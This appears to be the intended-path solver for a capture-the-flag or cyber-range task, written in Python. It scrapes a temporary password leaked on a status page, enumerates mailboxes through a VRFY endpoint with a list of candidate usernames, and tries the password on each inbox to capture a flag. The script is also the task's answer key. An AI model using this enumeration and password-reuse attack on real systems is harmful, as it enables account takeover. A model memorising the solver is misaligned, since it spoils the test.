"""Intended-path solver: VRFY enumeration, then password reuse across inboxes."""

import re

import httpx

from openrange.content.solver import SolveResult, TaskResult, find_flags

CANDIDATES = ["root", "admin", "postmaster", "reception", "jharper"]
PASSWORD_RE = re.compile(r"temporary password <code>([^<]+)</code>")


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    base = ctx.url()
    captured = None
    with httpx.Client(timeout=10) as client:
        home = client.get(f"{base}/")
        leak = PASSWORD_RE.search(home.text)
        if leak is None:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="vrfy-inbox",
                        ok=False,
                        detail="no temporary password found on the status page",
                    )
                ]
            )
        password = leak.group(1)
        detail = None
        valid = []
        for name in CANDIDATES:
            res = client.get(f"{base}/api/vrfy", params={"user": name})
            if res.text.startswith("250"):
                valid.append(name)

        hit = None
        for name in valid:
            res = client.get(f"{base}/inbox/{name}", auth=(name, password))
            flags = find_flags(res.text)
            if flags:
                hit, captured = name, flags[0]
                break

        if captured:
            detail = f"flag found in inbox of {hit} after enumerating {len(valid)} mailboxes"
        elif not valid:
            detail = "VRFY enumeration returned no valid mailboxes"

    return SolveResult(
        results=[
            TaskResult(
                task_id="vrfy-inbox",
                ok=captured is not None,
                captured=captured,
                detail=detail,
            )
        ]
    )
